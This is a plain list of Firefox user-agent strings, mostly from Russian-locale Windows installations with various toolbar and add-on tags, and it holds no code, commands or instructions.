Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03402) Firefox/3.5.16 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03790) Firefox/3.5.16 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.7 (build 03686) Firefox/3.0.17 (.NET CLR 3.5.30729) sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5 sputnik 2.5.3.31
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009032802 Mandriva/1.9.0.8-1mdv2009.1 (2009.1) Firefox/3.0.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 sputnik 2.4.0.30
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) BTRS29785 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.7 (build 03797) Firefox/3.0.1 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03796) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbCLA/3.8.0.12304 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSPC2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSPC2/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.7 (build 03796) Firefox/3.5.5 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03278) Firefox/3.5.16 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbCLM/3.9.1.14019 Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) AskTbPTV/3.9.1.14019 Firefox/3.6.13 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03797) Firefox/3.6.11 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 (.NET CLR 3.5.30729) sputnik 2.3.0.76
Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120513 Firefox/12.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03790) Firefox/3.5.16 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110121 Firefox/3.6.14 ( .NET CLR 3.0.04506.30)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100503 Firefox/3.6.4 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.6 (build 03402) Firefox/3.0.1 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03797) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03658) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101130 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03392) Firefox/3.6.3 sputnik 2.5.3.134
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.16
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.30
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.6 (build 03278) Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 BTRS26718 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.5 (build 02746) Firefox/3.5.16 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.3.0.76
Mozilla/5.0 (Windows NT 4.0; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 RubarToolbar2714 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03385) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.4.0.33
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03392) Firefox/3.6.3 sputnik 2.5.3.136
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) AskTbSPC2/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Ant.com Toolbar 2.0 Firefox/3.5.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03403) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.19) Gecko/2010031422 AskTbPTV2/3.9.1.14019 Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03797) Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.7 (build 03796) Firefox/3.0.1 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729) sputnik 2.5.3.31
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.14pre) Gecko/20101223 ALTLinux/Sisyphus/3.6.13-alt0.20101222.M50P.1 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.3.0.76
Mozilla/5.0 (X11; FreeBSD amd64; rv:26.0) Gecko/20100101 Firefox/26.0
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/2.0.0.13;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03403) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.3.134
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.4 (build 02647) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03797) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV/3.9.1.14019 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.4.0.40
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 AskTbBT5/3.9.1.14019 Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03796) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbCLA/3.11.0.15286 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03399) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 RubarToolbar2714 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 (6A9EA47F-787F-F996-D857-F5782F6802A3) Firefox/26.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03797) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03791) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13 GTB7.1 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AdCentriaIM/1.7 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.7) Gecko/20100701 MRA 5.7 (build 03797) Firefox/3.6.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03797) Firefox/3.6.6 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03796) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 1.1.4322)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03796) Firefox/3.0.19 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.6) Gecko/20091201 Ant.com Toolbar 2.0.1 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/2.0.0.8;MEGAUPLOAD 1.0 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.12) Gecko/20101031 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03757) Firefox/3.5.16
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.2.0.32
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03780) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:37.77.167.142]
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03790) Firefox/3.6 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:90.46.91.224]
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.2.3) Gecko/20100405 Namoroka/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 GTB7.1 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Glue/4.5 ( )
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.7 (build 03796) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 sputnik 2.4.0.40
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 RubarToolbar2714
Mozilla/5.0 (X11; Linux i686; rv:2.0b11) Gecko/20100101 Firefox/4.0b11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFF/3.11.3.15590 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSPC2/3.9.1.14019 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 RubarToolbar2714 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 BTRS35926 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03278) Firefox/3.5.16
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03780) Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbFXTV5/3.9.1.14019 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.30
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03789) Firefox/3.0.19 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 sputnik 2.0.1.41 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03790) Firefox/3.5.16 GTB7.1 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFF/3.8.0.12304 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 AskTbPTV/3.9.1.14019 Firefox/3.5.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 AdCentriaIM/1.7 Firefox/3.5.16
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.7 (build 03790) Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03797) Firefox/3.5.16 sputnik 2.4.0.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03796) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSTC/3.9.1.14019 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03797) Firefox/3.0.19
